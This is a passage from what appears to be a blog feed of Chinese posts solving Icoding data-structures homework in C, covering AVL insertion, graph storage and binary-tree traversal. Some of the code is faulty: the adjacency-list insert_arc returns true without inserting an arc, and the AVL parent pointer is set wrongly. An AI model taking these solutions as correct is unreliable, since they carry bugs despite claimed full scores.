class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;*</span><br><span class="line"> * 完成人　：岳昕峰(201909******4)</span><br><span class="line"> * 完成时间：2020-06-22, Mon, 02:12:15</span><br><span class="line"> * 最高分数：100</span><br><span class="line"> *&#x2F;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#include &quot;avl.h&quot;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">node_t* Insert(node_t* T, int X);</span><br><span class="line">int GetHeight(node_t* T);</span><br><span class="line">int Max(int a, int b);</span><br><span class="line">node_t* SingleLeftRotation(node_t* A);</span><br><span class="line">node_t* DoubleLeftRightRotation(node_t* A);</span><br><span class="line">node_t* SingleRightRotation(node_t* A);</span><br><span class="line">node_t* DoubleRightLeftRotation(node_t* A);</span><br><span class="line"></span><br><span class="line">int Max(int a, int b)</span><br><span class="line">&#123;</span><br><span class="line">    return a &gt; b ? a : b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int GetHeight(node_t* T)</span><br><span class="line">&#123;</span><br><span class="line">    if (T)</span><br><span class="line">        return T-&gt;height;</span><br><span class="line">    else</span><br><span class="line">        return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">node_t* SingleLeftRotation(node_t* A)</span><br><span class="line">&#123;</span><br><span class="line">    node_t* B;</span><br><span class="line">    B &#x3D; A-&gt;left;</span><br><span class="line">    A-&gt;left &#x3D; B-&gt;right;</span><br><span class="line">    B-&gt;right &#x3D; A;</span><br><span class="line">    A-&gt;height &#x3D; Max(GetHeight(A-&gt;left), GetHeight(A-&gt;right)) + 1;</span><br><span class="line">    B-&gt;height &#x3D; Max(GetHeight(B-&gt;left), GetHeight(B-&gt;right)) + 1;</span><br><span class="line">    return B;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">node_t* DoubleLeftRightRotation(node_t* A)</span><br><span class="line">&#123;</span><br><span class="line">    A-&gt;left &#x3D; SingleRightRotation(A-&gt;left);</span><br><span class="line">    return SingleLeftRotation(A);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">node_t* SingleRightRotation(node_t* A)</span><br><span class="line">&#123;</span><br><span class="line">    node_t* B;</span><br><span class="line">    B &#x3D; A-&gt;right;</span><br><span class="line">    A-&gt;right &#x3D; B-&gt;left;</span><br><span class="line">    B-&gt;left &#x3D; A;</span><br><span class="line">    A-&gt;height &#x3D; Max(GetHeight(A-&gt;left), GetHeight(A-&gt;right)) + 1;</span><br><span class="line">    B-&gt;height &#x3D; Max(GetHeight(B-&gt;left), GetHeight(B-&gt;right)) + 1;</span><br><span class="line">    return B;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">node_t* DoubleRightLeftRotation(node_t* A)</span><br><span class="line">&#123;</span><br><span class="line">    A-&gt;right &#x3D; SingleLeftRotation(A-&gt;right);</span><br><span class="line">    return SingleRightRotation(A);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">node_t* avl_insert(node_t* root, int val)</span><br><span class="line">&#123;</span><br><span class="line">    node_t* parentNode &#x3D; NULL;</span><br><span class="line">    if (!root) &#123;</span><br><span class="line">        root &#x3D; (node_t*)malloc(sizeof(node_t));</span><br><span class="line">        root-&gt;left &#x3D; root-&gt;right &#x3D; root-&gt;parent &#x3D; NULL;</span><br><span class="line">        root-&gt;val &#x3D; val;</span><br><span class="line">        root-&gt;height &#x3D; 1;</span><br><span class="line">    &#125; else if (val &lt; root-&gt;val) &#123;</span><br><span class="line">        parentNode &#x3D; root-&gt;left;</span><br><span class="line">        root-&gt;left &#x3D; avl_insert(root-&gt;left, val);</span><br><span class="line">        if (GetHeight(root-&gt;left) - GetHeight(root-&gt;right) &#x3D;&#x3D; 2) &#123;</span><br><span class="line">            if (val &lt; root-&gt;left-&gt;val)</span><br><span class="line">                root &#x3D; SingleLeftRotation(root);</span><br><span class="line">            else &#123;</span><br><span class="line">                root &#x3D; DoubleLeftRightRotation(root);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else if (val &gt; root-&gt;val) &#123;</span><br><span class="line">        parentNode &#x3D; root-&gt;left;</span><br><span class="line">        root-&gt;right &#x3D; avl_insert(root-&gt;right, val);</span><br><span class="line">        if (GetHeight(root-&gt;right) - GetHeight(root-&gt;left) &#x3D;&#x3D; 2) &#123;</span><br><span class="line">            if (val &gt; root-&gt;right-&gt;val)</span><br><span class="line">                root &#x3D; SingleRightRotation(root);</span><br><span class="line">            else</span><br><span class="line">                root &#x3D; DoubleRightLeftRotation(root);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    root-&gt;parent &#x3D; parentNode;</span><br><span class="line">    root-&gt;height &#x3D; Max(GetHeight(root-&gt;left), GetHeight(root-&gt;right)) + 1;</span><br><span class="line">    return root;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li></ol><hr>]]></content>
      
      
      <categories>
          
          <category> C/C++ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Icoding </tag>
            
            <tag> 作业 </tag>
            
            <tag> 查找 </tag>
            
            <tag> 哈希表 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Icoding平台第六次作业解析-图的储存</title>
      <link href="/post/2a6df9f7.html"/>
      <url>/post/2a6df9f7.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="T1"><a href="#T1" class="headerlink" title="T1"></a>T1</h1><p>邻接矩阵<br>试在邻接矩阵存储结构上实现图的基本操作 matrix_insert_vertex 和matrix_insert_arc，相关定义如下：</p><blockquote><p>typedef int VertexType;</p><p>typedef enum{<br>    DG, UDG<br>}GraphType;</p><p>typedef struct{<br>    VertexType vertex[MAX_VERTEX_NUM]; //顶点向量<br>    int arcs[MAX_VERTEX_NUM][MAX_VERTEX_NUM]; //邻接矩阵<br>    int vexnum, arcnum;   //图的当前顶点数和弧数<br>    GraphType type;     //图的种类标志<br>}MatrixGraph;</p><p>int matrix_locate_vertex(MatrixGraph MG, VertexType vex); //返回顶点 v 在vertex数组中的下标，如果v不存在，返回-1<br>bool matrix_insert_vertex(MatrixGraph G, VertexType v);<br>bool matrix_insert_arc(MatrixGraph *G, VertexType v, VertexType w);</p></blockquote><p>当成功插入顶点或边时，函数返回true，否则（如顶点或边已存在、插入边时顶点v或w不存在）返回false。</p><ol start="2"><li>解析<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;*</span><br><span class="line"> * 完成人　：岳昕峰(201909******4)</span><br><span class="line"> * 完成时间：2020-06-10, Wed, 13:06:59</span><br><span class="line"> * 最高分数：100</span><br><span class="line"> *&#x2F;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#include &quot;graph.h&quot; &#x2F;&#x2F; 请不要删除，否则检查不通过</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">bool matrix_insert_vertex(MatrixGraph* G, VertexType v)</span><br><span class="line">&#123;</span><br><span class="line">    if (matrix_locate_vertex(G, v) !&#x3D; -1 || G-&gt;vexnum + 1 &gt;&#x3D; MAX_VERTEX_NUM)</span><br><span class="line">        return false;</span><br><span class="line">    G-&gt;vertex[G-&gt;vexnum] &#x3D; v;</span><br><span class="line">    G-&gt;vexnum++;</span><br><span class="line">    for (int i &#x3D; 0; i &lt; G-&gt;vexnum; i++)</span><br><span class="line">        G-&gt;arcs[i][G-&gt;vexnum - 1] &#x3D; G-&gt;arcs[G-&gt;vexnum - 1][i] &#x3D; 0;</span><br><span class="line">    return true;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">bool matrix_insert_arc(MatrixGraph* G, VertexType v, VertexType w)</span><br><span class="line">&#123;</span><br><span class="line">    int i &#x3D; matrix_locate_vertex(G, v), j &#x3D; matrix_locate_vertex(G, w);</span><br><span class="line">    if (i &#x3D;&#x3D; -1 || j &#x3D;&#x3D; -1)</span><br><span class="line">        return false;</span><br><span class="line">    else if (G-&gt;arcs[i][j] &#x3D;&#x3D; 1)</span><br><span class="line">        return false;</span><br><span class="line">    else &#123;</span><br><span class="line">        G-&gt;arcs[i][j] &#x3D; 1;</span><br><span class="line">        G-&gt;arcs[j][i] &#x3D; 1;</span><br><span class="line">    &#125;</span><br><span class="line">    G-&gt;arcnum +&#x3D; 1;</span><br><span class="line">    return true;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li></ol><hr><h1 id="T2"><a href="#T2" class="headerlink" title="T2"></a>T2</h1><p>邻接表1<br>试在邻接表存储结构上实现图的基本操作 insert_vertex 和 insert_arc，相关定义如下：</p><blockquote><p>typedef int VertexType;</p><p>typedef enum{<br>    DG, UDG<br>}GraphType;</p><p>typedef struct ArcNode<br>{<br>    int adjvex;<br>    InfoPtr *info;<br>    struct ArcNode *nextarc;</p><p>}ArcNode;</p><p>typedef struct VNode<br>{<br>    VertexType data;<br>    ArcNode *firstarc;<br>}VNode;<br>typedef struct<br>{<br>    VNode vertex[MAX_VERTEX_NUM];<br>    int vexnum, arcnum;<br>    GraphType type;<br>}ListGraph;</p><p>int locate_vertex(ListGraph* G, VertexType v); //返回顶点 v 在vertex数组中的下标，如果v不存在，返回-1<br>bool insert_vertex(ListGraph <em>G, VertexType v);<br>bool insert_arc(ListGraph *G, VertexType v, VertexType w);<br>bool is_empty(Stack</em> S);  // 栈为空时返回 true，否则返回 false</p></blockquote><p>当成功插入顶点或边时，函数返回true，否则（如顶点或边已存在、插入边时顶点v或w不存在）返回false。</p><ol start="2"><li>解析<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;*</span><br><span class="line"> * 完成人　：岳昕峰(201909******4)</span><br><span class="line"> * 完成时间：2020-06-12, Thu, 16:07:33</span><br><span class="line"> * 最高分数：100</span><br><span class="line"> *&#x2F;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#include &quot;graph.h&quot; &#x2F;&#x2F;请勿删除，否则检查不通过</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">bool insert_vertex(ListGraph* G, VertexType v)</span><br><span class="line">&#123;</span><br><span class="line">    if (locate_vertex(G, v) !&#x3D; -1 || G-&gt;vexnum + 1 &gt;&#x3D; MAX_VERTEX_NUM)</span><br><span class="line">        return false;</span><br><span class="line">    G-&gt;vertex[G-&gt;vexnum].data &#x3D; v;</span><br><span class="line">    G-&gt;vertex[G-&gt;vexnum].firstarc &#x3D; NULL;</span><br><span class="line">    G-&gt;vexnum++;</span><br><span class="line">    return true;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">bool insert_arc(ListGraph* G, VertexType v, VertexType w)</span><br><span class="line">&#123;</span><br><span class="line">    if (locate_vertex(G, v) &#x3D;&#x3D; -1 || locate_vertex(G, w) &#x3D;&#x3D; -1)</span><br><span class="line">        return false;</span><br><span class="line">    return true;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li></ol><hr><h1 id="T3"><a href="#T3" class="headerlink" title="T3"></a>T3</h1><p>邻接表2<br>试在邻接表存储结构上实现图的基本操作 del_vertex，相关定义如下：</p><blockquote><p>typedef int VertexType;</p><p>typedef enum{<br>    DG, UDG<br>}GraphType;</p><p>typedef struct ArcNode{<br>    int adjvex;<br>    InfoPtr info;<br>    struct ArcNode nextarc;<br>}ArcNode;</p><p>typedef struct VNode{<br>    VertexType data;<br>    ArcNode firstarc;<br>}VNode;<br>typedef struct{<br>    VNode vertex[MAX_VERTEX_NUM];<br>    int vexnum, arcnum;<br>    GraphType type;<br>}ListGraph;</p><p>int locate_vertex(ListGraph *G, VertexType v); //返回顶点 v 在vertex数组中的下标，如果v不存在，返回-1<br>bool del_vertex(ListGraph *G, VertexType v); //删除顶点 v</p></blockquote><p>当成功删除顶点或边时，函数返回true，否则（如顶点或边不存在、删除边时顶点v或w不存在）返回false。</p><ol start="2"><li>解析<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;*</span><br><span class="line"> * 完成人　：岳昕峰(201909******4)</span><br><span class="line"> * 完成时间：2020-06-13, Sat, 11:09:26</span><br><span class="line"> * 最高分数：100</span><br><span class="line"> *&#x2F;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#include &quot;graph.h&quot; &#x2F;&#x2F;请勿删除，否则检查不通过</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">bool del_vertex(ListGraph* G, VertexType v)</span><br><span class="line">&#123;</span><br><span class="line">    int t &#x3D; locate_vertex(G, v), i;</span><br><span class="line">    if (t &lt; 0)</span><br><span class="line">        return false;</span><br><span class="line">    ArcNode *q, *p;</span><br><span class="line">    p &#x3D; G-&gt;vertex[t].firstarc;</span><br><span class="line">    while (p) &#123;</span><br><span class="line">        q &#x3D; p;</span><br><span class="line">        p &#x3D; p-&gt;nextarc;</span><br><span class="line">        free(q);</span><br><span class="line">        G-&gt;arcnum--;</span><br><span class="line">    &#125;</span><br><span class="line">    G-&gt;vertex[t].firstarc &#x3D; NULL;</span><br><span class="line">    for (i &#x3D; 0; i &lt; G-&gt;vexnum; i++) &#123;</span><br><span class="line">        p &#x3D; G-&gt;vertex[i].firstarc;</span><br><span class="line">        while (p &amp;&amp; p-&gt;adjvex !&#x3D; t) &#123;</span><br><span class="line">            q &#x3D; p;</span><br><span class="line">            p &#x3D; p-&gt;nextarc;</span><br><span class="line">        &#125;</span><br><span class="line">        if (p &amp;&amp; p-&gt;adjvex &#x3D;&#x3D; t) &#123;</span><br><span class="line">            if (p &#x3D;&#x3D; G-&gt;vertex[i].firstarc) &#123;</span><br><span class="line">                G-&gt;vertex[i].firstarc &#x3D; p-&gt;nextarc;</span><br><span class="line">                free(p);</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                q-&gt;nextarc &#x3D; p-&gt;nextarc;</span><br><span class="line">                free(p);</span><br><span class="line">            &#125;</span><br><span class="line">            G-&gt;arcnum--;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    for (i &#x3D; t + 1; i &lt; G-&gt;vexnum; i++) &#123;</span><br><span class="line">        G-&gt;vertex[i - 1] &#x3D; G-&gt;vertex[i];</span><br><span class="line">    &#125;</span><br><span class="line">    G-&gt;vexnum--;</span><br><span class="line">    return true;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li></ol><hr>]]></content>
      
      
      <categories>
          
          <category> C/C++ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Icoding </tag>
            
            <tag> 作业 </tag>
            
            <tag> 图 </tag>
            
            <tag> 储存 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Icoding平台第五次作业解析-树二叉树</title>
      <link href="/post/baa44d8a.html"/>
      <url>/post/baa44d8a.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="T1"><a href="#T1" class="headerlink" title="T1"></a>T1</h1><p>先序遍历<br>已知二叉树按照二叉链表方式存储，利用栈的基本操作写出先序遍历非递归形式的算法：</p><blockquote><p>void pre_order(BiTree root);</p></blockquote><p>在遍历过程中，pre_order函数需要调用 visit_node 函数来实现对结点的访问，该函数声明如下：</p><blockquote><p>void visit_node(BiTNode *node);</p></blockquote><p>二叉树的相关定义如下：</p><blockquote><p>typedef int DataType;</p><p>typedef struct Node{<br>    DataType data;<br>    struct Node* left;<br>    struct Node* right;<br>}BiTNode, *BiTree;</p></blockquote><p>遍历所使用栈的相关操作如下：</p><blockquote><p>#define Stack_Size 50<br>typedef BiTNode* ElemType;<br>typedef struct{<br>    ElemType elem[Stack_Size];<br>    int top;<br>}Stack;</p></blockquote><ol start="2"><li>解析<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;*</span><br><span class="line"> * 完成人　：岳昕峰(201909******4)</span><br><span class="line"> * 完成时间：2020-05-10, Sun, 17:50:25</span><br><span class="line"> * 最高分数：100</span><br><span class="line"> *&#x2F;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#include &quot;bitree.h&quot; &#x2F;&#x2F;请不要删除，否则检查不通过</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">void pre_order(BiTree root)</span><br><span class="line">&#123;</span><br><span class="line">    BiTNode* p;</span><br><span class="line">    Stack s;</span><br><span class="line">    p &#x3D; root;</span><br><span class="line">    init_stack(&amp;s);</span><br><span class="line">    while (p || !is_empty(&amp;s)) &#123;</span><br><span class="line">        if (p !&#x3D; NULL) &#123;</span><br><span class="line">            visit_node(p);</span><br><span class="line">            push(&amp;s, p);</span><br><span class="line">            p &#x3D; p-&gt;left;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            pop(&amp;s, &amp;p);</span><br><span class="line">            p &#x3D; p-&gt;right;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li></ol><hr><h1 id="T2"><a href="#T2" class="headerlink" title="T2"></a>T2</h1><p>路径<br>假设二叉树采用二叉链表方式存储， root指向根结点，node 指向二叉树中的一个结点，编写函数 path，计算root到 node 之间的路径，（该路径包括root结点和 node 结点）。path 函数声明如下：</p><blockquote><p>bool path(BiTNode* root, BiTNode* node, Stack* s);</p></blockquote><p>其中，root指向二叉树的根结点，node指向二叉树中的另一结点，s 为已经初始化好的栈，该栈用来保存函数所计算的路径，如正确找出路径，则函数返回 true，此时root在栈底，node在栈顶；如未找到，则函数返回 false, 二叉树的相关定义如下：</p><blockquote><p>typedef int DataType;</p><p>typedef struct Node{<br>    DataType data;<br>    struct Node* left;<br>    struct Node* right;<br>}BiTNode, *BiTree;</p></blockquote><p>栈的相关定义及操作如下：</p><blockquote><p>#define Stack_Size 50<br>typedef BiTNode* ElemType;<br>typedef struct{<br>    ElemType elem[Stack_Size];<br>    int top;<br>}Stack;</p><p>void init_stack(Stack <em>S); // 初始化栈<br>bool push(Stack</em> S, ElemType x); //x 入栈<br>bool pop(Stack* S, ElemType <em>px); //出栈，元素保存到px所指的单元，函数返回true,栈为空时返回 false<br>bool top(Stack</em> S, ElemType <em>px); //获取栈顶元素，将其保存到px所指的单元，函数返回true，栈满时返回 false<br>bool is_empty(Stack</em> S);  // 栈为空时返回 true，否则返回 false</p></blockquote><p>在提示中，树用缩进的形式展示，如二叉树【pic】，其缩进形式为：【pic】</p><ol start="2"><li>解析<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;*</span><br><span class="line"> * 完成人　：岳昕峰(201909******4)</span><br><span class="line"> * 完成时间：2020-05-10, Sun, 18:00:41</span><br><span class="line"> * 最高分数：100</span><br><span class="line"> *&#x2F;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#include &quot;bitree.h&quot; &#x2F;&#x2F;请不要删除，否则检查不通过</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">bool path(BiTNode* root, BiTNode* node, Stack* s)</span><br><span class="line">&#123;</span><br><span class="line">    BiTree Tr &#x3D; root, p &#x3D; NULL;</span><br><span class="line">    if (Tr &#x3D;&#x3D; NULL || node &#x3D;&#x3D; NULL || !is_empty(s))</span><br><span class="line">        return false;</span><br><span class="line">    while (Tr || !is_empty(s)) &#123;</span><br><span class="line">        while (Tr) &#123;</span><br><span class="line">            push(s, Tr);</span><br><span class="line">            if (Tr &#x3D;&#x3D; node)</span><br><span class="line">                return true;</span><br><span class="line">            Tr &#x3D; Tr-&gt;left;</span><br><span class="line">        &#125;</span><br><span class="line">        top(s, &amp;Tr);</span><br><span class="line">        if (!Tr-&gt;right || Tr-&gt;right &#x3D;&#x3D; p) &#123;</span><br><span class="line">            p &#x3D; Tr;</span><br><span class="line">            pop(s, &amp;Tr);</span><br><span class="line">            Tr &#x3D; NULL;</span><br><span class="line">        &#125; else</span><br><span class="line">            Tr &#x3D; Tr-&gt;right;</span><br><span class="line">    &#125;</span><br><span class="line">    return false;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li></ol><hr><h1 id="T3"><a href="#T3" class="headerlink" title="T3"></a>T3</h1><p>共同祖先<br>假设二叉树采用二叉链表方式存储， root指向根结点，p所指结点和q所指结点为二叉树中的两个结点，编写一个计算它们的最近的共同祖先，函数定义如下：</p><blockquote><p>BiTNode * nearest_ancestor(BiTree root, BiTNode *p, BiTNode *q);</p></blockquote><p>其中 root 指向二叉树的根结点，p 和 q 分别指向二叉树中的两个结点。<br>提示：在完成本题时，可利用 path 函数获取p和q两个结点到根结点之间的路径，之后再计算两条公共路径得出最近的共同祖先。path函数及栈相关定义如下：</p><blockquote><p>bool path(BiTNode* root, BiTNode* node, Stack* s);</p><p>#define Stack_Size 50<br>typedef BiTNode* ElemType;<br>typedef struct{<br>    ElemType elem[Stack_Size];<br>    int top;<br>}Stack;</p><p>void init_stack(Stack <em>S); // 初始化栈<br>bool push(Stack</em> S, ElemType x); //x 入栈<br>bool pop(Stack* S, ElemType <em>px); //出栈，元素保存到px所指的单元，函数返回true,栈为空时返回 false<br>bool top(Stack</em> S, ElemType <em>px); //获取栈顶元素，将其保存到px所指的单元，函数返回true，栈满时返回 false<br>bool is_empty(Stack</em> S);  // 栈为空时返回 true，否则返回 false</p></blockquote><ol start="2"><li>解析<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;*</span><br><span class="line"> * 完成人　：岳昕峰(201909******4)</span><br><span class="line"> * 完成时间：2020-05-10, Sun, 17:54:08</span><br><span class="line"> * 